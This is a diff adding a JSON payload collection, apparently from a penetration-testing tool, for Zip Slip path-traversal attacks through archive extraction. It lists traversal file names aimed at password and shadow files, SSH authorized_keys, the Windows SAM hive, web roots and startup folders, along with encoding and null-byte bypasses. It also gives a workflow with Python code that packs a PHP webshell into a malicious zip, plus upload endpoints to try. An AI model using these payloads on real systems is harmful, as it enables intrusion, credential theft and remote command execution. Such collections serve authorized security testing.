@@ -1,0 +1,133 @@
+{
+  "info": {
+    "name": "Zip Slip Payload Templates",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "Zip Slip (path traversal via archive extraction) payload templates and exploitation workflows. 2026 updated.",
+    "category": "Archive",
+    "severity": "HIGH",
+    "owasp": "A01:2021 - Broken Access Control"
+  },
+  "payload_templates": {
+    "linux_traversal": [
+      {"path": "../../etc/passwd", "type": "file_read", "target": "Unix /etc/passwd"},
+      {"path": "../../../../../etc/passwd", "type": "file_read", "target": "Deep traversal /etc/passwd"},
+      {"path": "../../etc/shadow", "type": "file_read_root", "target": "Unix /etc/shadow"},
+      {"path": "../../../../../etc/shadow", "type": "file_read_root", "target": "Deep traversal /etc/shadow"},
+      {"path": "../../etc/hosts", "type": "file_read", "target": "Unix /etc/hosts"},
+      {"path": "../../root/.ssh/authorized_keys", "type": "ssh_key_injection", "target": "SSH authorized_keys"},
+      {"path": "../../var/www/html/shell.php", "type": "rce_webshell", "target": "Web root shell"},
+      {"path": "../../var/log/apache2/access.log", "type": "log_poisoning", "target": "Apache access log"},
+      {"path": "../../var/log/nginx/access.log", "type": "log_poisoning", "target": "Nginx access log"},
+      {"path": "../../tmp/shell.sh", "type": "script_upload", "target": "Temp script execution"},
+      {"path": "../../proc/self/environ", "type": "env_disclosure", "target": "Process environment"}
+    ],
+    "windows_traversal": [
+      {"path": "../../Windows/System32/config/sam", "type": "credential_dump", "target": "Windows SAM database"},
+      {"path": "../../../../../Windows/System32/config/sam", "type": "credential_dump", "target": "Deep SAM extraction"},
+      {"path": "../../Windows/System32/config/SYSTEM", "type": "credential_dump", "target": "Windows SYSTEM hive"},
+      {"path": "../../Windows/System32/config/SECURITY", "type": "credential_dump", "target": "Windows SECURITY hive"},
+      {"path": "../../Windows/System32/drivers/etc/hosts", "type": "file_read", "target": "Windows hosts file"},
+      {"path": "../../inetpub/wwwroot/shell.aspx", "type": "rce_webshell", "target": "IIS web root shell"},
+      {"path": "../../../../inetpub/wwwroot/shell.aspx", "type": "rce_webshell", "target": "Deep IIS web root"},
+      {"path": "../../Windows/Temp/shell.asp", "type": "script_upload", "target": "Windows temp script"},
+      {"path": "../../ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/shell.vbs", "type": "persistence", "target": "Startup persistence"}
+    ],
+    "web_root_traversal": [
+      {"path": "../../var/www/html/shell.php", "type": "rce_webshell", "target": "Apache/Nginx web root"},
+      {"path": "../../var/www/html/wp-config.php", "type": "config_read", "target": "WordPress config"},
+      {"path": "../../var/www/html/.env", "type": "env_disclosure", "target": "Environment variables"},
+      {"path": "../../app/views/shell.php", "type": "rce_webshell", "target": "Laravel web root"},
+      {"path": "../../public_html/shell.php", "type": "rce_webshell", "target": "cPanel web root"},
+      {"path": "../../htdocs/shell.php", "type": "rce_webshell", "target": "Apache htdocs"},
+      {"path": "../../webapps/ROOT/shell.jsp", "type": "rce_webshell", "target": "Tomcat webapps"},
+      {"path": "../../www/shell.php", "type": "rce_webshell", "target": "Generic web root"}
+    ],
+    "encoding_bypass": [
+      {"path": "..%252f..%252fetc%252fpasswd", "type": "double_url_encode", "target": "Double encoded traversal"},
+      {"path": "..%252f..%252f..%252fetc%252fpasswd", "type": "double_url_encode", "target": "Deep double encoded"},
+      {"path": "..%c0%af..%c0%afetc%c0%afpasswd", "type": "overlong_utf8", "target": "Overlong UTF-8 bypass"},
+      {"path": "..%c1%9c..%c1%9cetc%c1%9cpasswd", "type": "overlong_utf8", "target": "Overlong UTF-8 WIN"},
+      {"path": "....//....//etc/passwd", "type": "double_slash", "target": "Double slash bypass"},
+      {"path": "..///..///etc/passwd", "type": "triple_slash", "target": "Triple slash bypass"},
+      {"path": "..\\..\\..\\etc\\passwd", "type": "backslash", "target": "Backslash traversal"},
+      {"path": "..%5c..%5c..%5cetc%5cpasswd", "type": "url_backslash", "target": "URL encoded backslash"}
+    ],
+    "null_byte_truncation": [
+      {"path": "../../etc/passwd%00.jpg", "type": "null_byte_truncation", "target": "Null byte extension kill"},
+      {"path": "../../etc/passwd\u0000.jpg", "type": "unicode_null", "target": "Unicode null truncation"},
+      {"path": "../../etc/passwd%00", "type": "null_byte_kill_ext", "target": "Null byte extension kill only"}
+    ],
+    "absolute_path_abuse": [
+      {"path": "/etc/passwd", "type": "absolute_path", "target": "Absolute path Unix"},
+      {"path": "/Windows/System32/config/sam", "type": "absolute_path", "target": "Absolute path Windows"},
+      {"path": "/var/www/html/shell.php", "type": "absolute_rce", "target": "Absolute web root shell"}
+    ],
+    "special_characters": [
+      {"path": "../../etc/passwd\n", "type": "newline_injection", "target": "Newline character"},
+      {"path": "../../etc/passwd ", "type": "trailing_space", "target": "Trailing space"},
+      {"path": "../../etc/passwd\t", "type": "tab_injection", "target": "Tab injection"}
+    ]
+  },
+  "exploitation_workflow": {
+    "step_1_create_malicious_zip": {
+      "description": "Create zip with path traversal filenames",
+      "methods": [
+        {"name": "Python zipfile", "code": "import zipfile, io\nz = zipfile.ZipFile('exploit.zip', 'w')\nz.writestr('../../shell.php', '<?php system($_GET[\"cmd\"]); ?>')"},
+        {"name": "zip command", "code": "zip exploit.zip '../../shell.php'"}
+      ]
+    },
+    "step_2_upload_zip": {
+      "description": "Upload the malicious zip to the target endpoint",
+      "endpoints": [
+        "POST /api/import",
+        "POST /api/upload",
+        "POST /upload",
+        "POST /api/extract",
+        "POST /api/backup/restore"
+      ]
+    },
+    "step_3_trigger_extraction": {
+      "description": "Trigger automatic or manual extraction",
+      "methods": [
+        "Automatic on upload",
+        "POST /api/extract with zip_id",
+        "GET /api/extract?file=uploaded.zip"
+      ]
+    },
+    "step_4_verify_exploitation": {
+      "description": "Verify if files were extracted to unexpected locations",
+      "checks": [
+        "GET /shell.php",
+        "Access extracted file via expected path",
+        "Check if webshell is accessible"
+      ]
+    }
+  },
+  "archive_formats": [
+    {"format": "zip", "extension": ".zip", "compression": "DEFLATED"},
+    {"format": "tar", "extension": ".tar", "compression": "none"},
+    {"format": "tar.gz", "extension": ".tar.gz", "compression": "gzip"},
+    {"format": "rar", "extension": ".rar", "compression": "RLE"},
+    {"format": "7z", "extension": ".7z", "compression": "LZMA2"},
+    {"format": "tar.bz2", "extension": ".tar.bz2", "compression": "bzip2"}
+  ],
+  "detection_indicators": [
+    "404", "File not found", "Access denied", "Permission denied",
+    "No such file", "Path traversal", "Invalid path", "Traversal attempt"
+  ],
+  "successful_indicators": [
+    "shell.php accessible", "<?php", "system(", "eval(",
+    "/etc/passwd content", "root:x:", "bin:x:"
+  ],
+  "upload_endpoints": [
+    "/api/import",
+    "/api/upload",
+    "/api/extract",
+    "/api/backup/restore",
+    "/upload",
+    "/import",
+    "/backup",
+    "/restore"
+  ]
+}
